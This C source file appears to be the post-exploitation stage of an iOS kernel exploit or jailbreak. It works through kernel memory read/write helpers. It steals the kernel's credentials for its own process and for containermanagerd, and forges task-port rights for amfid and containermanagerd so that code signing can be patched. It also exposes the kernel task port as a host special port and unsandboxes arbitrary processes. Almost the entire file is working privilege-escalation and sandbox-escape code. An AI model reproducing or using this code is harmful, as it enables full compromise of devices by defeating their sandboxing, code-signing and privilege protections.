#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <libgen.h>
#include <pthread.h>

#include <mach/mach.h>

#include "kernel_memory_helpers.h"
#include "offsets.h"

uint32_t allproc = 0;
uint32_t kernproc = 0;
uint32_t launchd_proc = 0;
uint32_t amfid_proc = 0;
uint32_t our_proc = 0;
uint32_t containermanager_proc = 0;

uint32_t get_proc_ipc_table(uint32_t proc) {
  uint32_t task_t = rk32(proc + struct_proc_task_offset);
  printf("task_t: 0x%x\n", task_t);
  
  uint32_t itk_space = rk32(task_t + struct_task_itk_space_offset);
  printf("itk_space: 0x%x\n", itk_space);
  
  uint32_t is_table = rk32(itk_space + struct_ipc_space_is_table_offset);
  printf("is_table: 0x%x\n", is_table);
  
  return is_table;
}

/* give ourselves a send right to this proc's task port */
mach_port_t proc_to_task_port(uint32_t proc) {
  // allocate a new raw mach port:
  mach_port_t p = MACH_PORT_NULL;
  mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
  mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);

  uint32_t ports = get_proc_ipc_table(proc);
  
  // get the task port:
  uint32_t task_port = rk32(ports + 0x18); // first port's ie_object
  // leak some refs:
  wk32(task_port+4, 0x383838);
  
  uint32_t task_t = rk32(proc + struct_proc_task_offset);
  // leak some refs
  wk32(task_t + struct_task_ref_count_offset, 0x393939);
  
  // get the address of the ipc_port of our newly allocate port
  uint32_t ipc_table = get_proc_ipc_table(our_proc);
  // point the port's ie_object to amfid's task port:
  wk32(ipc_table + ((p >> 8) * 0x18), task_port);
  
  // remove our receive right:
  uint32_t ie_bits = rk32(ipc_table + ((p >> 8) * 0x18) + 8);
  ie_bits &= ~(1<<17); // clear MACH_PORT_TYPE(MACH_PORT_RIGHT_RECEIVE)
  wk32(ipc_table + ((p >> 8) * 0x18) + 8, ie_bits);
  
  return p;
}

uint32_t proc_port_name_to_port_ptr(uint32_t proc, mach_port_name_t port_name) {
  uint32_t ports = get_proc_ipc_table(proc);
  uint32_t port_index = port_name >> 8;
  uint32_t port = rk32(ports + (0x18*port_index)); //ie_object
  return port;
}

mach_port_t get_amfid_task_port(){
  return proc_to_task_port(amfid_proc);
}

mach_port_t get_containermanagerd_task_port(){
  return proc_to_task_port(containermanager_proc);
}

/*
 * point launchd's send right to mitm_port back to real_service
 */
void fix_launchd_after_sandbox_escape(mach_port_t real_service, mach_port_t mitm_port) {
  uint32_t launchd_ports_table = get_proc_ipc_table(launchd_proc);
  printf("launchd's ipc_table: 0x%x\n", launchd_ports_table);
  
  uint32_t our_ports_table = get_proc_ipc_table(our_proc);
  
  
  printf("our ipc_table: 0x%x\n", our_ports_table);
  
  // find the address of the ipc_port for real_service:
  uint32_t real_service_ipc_entry = our_ports_table + ((real_service >> 8) * 0x18);
  uint32_t real_service_ipc_port = rk32(real_service_ipc_entry);
  
  // find the address of the ipc_port for mitm_port:
  uint32_t mitm_port_ipc_entry = our_ports_table + ((mitm_port >> 8) * 0x18);
  uint32_t mitm_port_ipc_port = rk32(mitm_port_ipc_entry);
  
  // scan through the ipc_entrys in launchd's table to find the address of the ipc_entry for mitm_port in launchd:
  uint32_t launchd_entry = launchd_ports_table;
  
  uint32_t port_here = 0;
  for (int port_offset = 0; port_offset < 0x100000; port_offset++) {
    port_here = rk32(launchd_entry);
    if (port_here == mitm_port_ipc_port) {
      break;
    }
    launchd_entry += 0x18;
  }
  
  if (port_here != mitm_port_ipc_port) {
    printf("failed to find the mitm_port in launchd\n");
  } else {
    printf("found the mitm_port in launchd's namespace\n");
  }
  
  // point launchd's entry to the real service:
  wk32(launchd_entry, real_service_ipc_port);
  
  // NULL out our entry completely:
  wk32(real_service_ipc_entry, 0);
  wk32(real_service_ipc_entry+0x08, 0);
  wk32(real_service_ipc_entry+0x10, 0);
}

uint32_t find_proc(char* target_p_comm) {
  uint32_t proc = rk32(allproc);
  
  for (int i = 0; i < 1000; i++) {
    char* p_comm = rkmem(proc+struct_proc_p_comm_offset, 16); // p_comm
    if (!p_comm){
      return 0;
    }
    if (strstr(p_comm, target_p_comm)) {
      free(p_comm);
      return proc;
    }
    
    free(p_comm);
    proc = rk32(proc);
  }
  return 0;
}

void copy_creds_from_to(uint32_t proc_from, uint32_t proc_to) {
  uint32_t creds_from = rk32(proc_from + struct_proc_p_ucred_offset);
  printf("kernel creds: 0x%x\n", creds_from);
  
  // leak the creds
  wk32(creds_from + struct_kauth_cred_cr_ref_offset, 0x444444);
  
  // replace our proc's cred point with it
  wk32(proc_to + struct_proc_p_ucred_offset, creds_from);
  
  // and to all our threads' cached cred pointers
  uint32_t uthread = rk32(proc_to + struct_proc_p_uthlist_offset);
  
  while (uthread != 0) {
    // update the uthread's cred
    wk32(uthread + struct_uthread_uu_ucred_offset, creds_from);
    printf("updated this thread's uu_ucreds\n");
    
    // get the next thread
    uthread = rk32(uthread + struct_uthread_uu_list_offset);
    printf("next uthread: 0x%x\n", uthread);
  }
}

void disable_protections(uint32_t kernel_base, uint32_t realhost, char* p_comm) {
  uint32_t kernproc_ptr = kernel_base + kernproc_offset;
  kernproc = rk32(kernproc_ptr);
  
  allproc = kernel_base + allproc_offset;


  launchd_proc = find_proc("launchd");
  amfid_proc = find_proc("amfid");
  our_proc = find_proc(p_comm);
  containermanager_proc = find_proc("containermanager");
  
  // we can then fix up launchd's send right to the service we messed up
  // and give ourselves launchd's creds
  // then patch out the codesigning checks in amfid.

  
  copy_creds_from_to(kernproc, our_proc);
  
  // unsandbox containermanagerd so it can make the containers for uid 0 processes
  // I do also have a patch for containermanagerd to fixup the persona_id in the sb_packbuffs
  // but this is much simpler (and also makes it easier to clear up the mess of containers!)
  // I ran out of time to properly undestand containers enough to write a better hook
  // for containermanagerd so this will have to do
  copy_creds_from_to(kernproc, containermanager_proc);
  
  // make the host port also point to the host_priv port:
  // the host port we gave our task will be reset by the sandbox hook
  uint32_t host_priv = rk32(realhost+0x20); // host special port 2
  wk32(realhost+0x18, host_priv); // host special 1
  
  // while we're at it set the kernel task port as host special port 4 (an unused host special port)
  // so other tools can get at it via host_get_special_port on the host_priv port
  uint32_t kernel_task_port_ptr = proc_port_name_to_port_ptr(our_proc, _kernel_task_port());
  wk32(realhost+0x30, kernel_task_port_ptr);
  printf("set the kernel task port as host special port 4\n");
}

void unsandbox_pid(pid_t target_pid) {
  uint32_t proc = rk32(allproc);
  
  for (int i = 0; i < 1000 && proc; i++) {
    uint32_t pid = rk32(proc + struct_proc_p_pid_offset);
    if (pid == target_pid) {
      copy_creds_from_to(kernproc, proc);
      return;
    }
    
    proc = rk32(proc);
  }
}
